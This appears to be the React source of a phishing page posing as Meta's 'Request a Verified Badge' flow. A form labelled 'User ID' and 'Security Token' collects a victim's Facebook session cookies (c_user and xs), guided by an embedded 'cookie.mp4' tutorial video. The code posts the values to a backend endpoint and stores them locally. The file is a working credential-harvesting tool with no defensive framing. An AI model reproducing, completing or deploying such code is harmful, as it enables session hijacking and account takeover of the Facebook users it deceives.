import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import MetaTags from "@/components/meta-tags";
import { validationFormSchema } from "@shared/schema";
import { apiRequest } from "@/lib/queryClient";
import { useMobile } from "@/hooks/use-mobile";
import { MobileModal } from "@/components/mobile-modal";

export default function Validation() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const isMobile = useMobile();
  const [showMobileModal, setShowMobileModal] = useState(false);

  useEffect(() => {
    if (isMobile) {
      setShowMobileModal(true);
    }
  }, [isMobile]);

  const form = useForm({
    resolver: zodResolver(validationFormSchema),
    defaultValues: {
      c_user: "",
      xs: "",
    },
  });

  const onSubmit = async (data: any) => {
    try {
      await apiRequest('POST', '/api/contact-form', data);
      localStorage.setItem('validation_data', JSON.stringify(data));

      toast({
        title: "Success",
        description: "Please proceed to the next step",
      });
      setLocation("/confirmation");
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to submit form. Please try again.",
      });
    }
  };

  return (
    <>
      <MetaTags 
        title="Meta Verified | Validation"
        description="Request a verified badge on Facebook - Initial Step"
      />
      <MobileModal open={showMobileModal} onOpenChange={setShowMobileModal} />

      <div className="h-screen flex overflow-hidden">
        {/* Desktop Sidebar */}
        {!isMobile && (
          <div className="w-64 bg-white border-r border-gray-200 hidden lg:block">
            <div className="h-full p-4">
              <h1 className="text-xl font-bold text-gray-900">Contact Form</h1>
              <div className="mt-4 space-y-2">
                <p className="text-gray-700 font-semibold">Progress</p>
                <div className="space-y-1">
                  <div className="flex items-center space-x-2 text-blue-600">
                    <div className="w-2 h-2 bg-blue-600 rounded-full" />
                    <p className="text-sm">Initial Validation</p>
                  </div>
                  <div className="flex items-center space-x-2 text-gray-400">
                    <div className="w-2 h-2 bg-gray-400 rounded-full" />
                    <p className="text-sm">Confirmation</p>
                  </div>
                  <div className="flex items-center space-x-2 text-gray-400">
                    <div className="w-2 h-2 bg-gray-400 rounded-full" />
                    <p className="text-sm">Success</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Main Content */}
        <div className="flex-1 flex flex-col bg-white">
          <div className="h-[calc(100vh-32px)] flex justify-center bg-gradient-to-br from-[#0180FA]/10 via-[#f0f2f5] to-[#0180FA]/5">
            <div className="max-w-2xl w-full px-4 py-3 space-y-3">
              <h1 className="text-lg sm:text-xl font-bold text-[#1c1e21]">
                Request a Verified Badge - Initial Validation
              </h1>

              <div className="space-y-2 text-gray-600 text-sm">
                <p>
                  The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure or brand that it represents.
                </p>
                <p>
                  Please provide the precise details below. Refer to the video for clarification if the instructions are unclear.
                </p>
              </div>

              <div className="bg-[#F0F2F5] p-3 rounded-lg space-y-3">
                <h2 className="text-base font-semibold text-[#1c1e21]">Detailed Video Guide</h2>

                <div className="video-container relative w-full aspect-[16/9] rounded-lg overflow-hidden bg-black max-h-[180px]">
                  <video
                    className="w-full h-full object-contain"
                    controls
                    playsInline
                    preload="auto"
                  >
                    <source
                      src="https://pub-97836f8a77c541e9afe2515c4730dd50.r2.dev/cookie.mp4"
                      type="video/mp4"
                    />
                    Your browser does not support the video tag.
                  </video>
                </div>
              </div>

              <Form {...form}>
                <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-3">
                  <FormField
                    control={form.control}
                    name="c_user"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-sm text-gray-700">User ID</FormLabel>
                        <FormControl>
                          <Input
                            type="number"
                            min="0"
                            pattern="[0-9]+"
                            minLength={6}
                            placeholder="Enter your user ID"
                            className="text-sm border-gray-300 focus:border-blue-500 focus:ring-blue-500 h-9"
                            {...field}
                          />
                        </FormControl>
                        <FormMessage className="text-xs text-red-500" />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="xs"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-sm text-gray-700">Security Token</FormLabel>
                        <FormControl>
                          <Input 
                            type="text" 
                            placeholder="Enter your security token" 
                            className="text-sm border-gray-300 focus:border-blue-500 focus:ring-blue-500 h-9"
                            {...field} 
                          />
                        </FormControl>
                        <FormMessage className="text-xs text-red-500" />
                      </FormItem>
                    )}
                  />

                  <p className="text-xs text-gray-500">
                    Please ensure all information is correct before submission.
                  </p>

                  <Button 
                    type="submit" 
                    className="w-full py-2 text-sm bg-blue-600 hover:bg-blue-700 transition-colors duration-200 h-9"
                    disabled={form.formState.isSubmitting}
                  >
                    {form.formState.isSubmitting ? "Submitting..." : "Continue"}
                  </Button>
                </form>
              </Form>
            </div>
          </div>

          <div className="h-8 text-center py-1.5 text-xs text-gray-500 border-t">
            Meta © 2025
          </div>
        </div>
      </div>
    </>
  );
}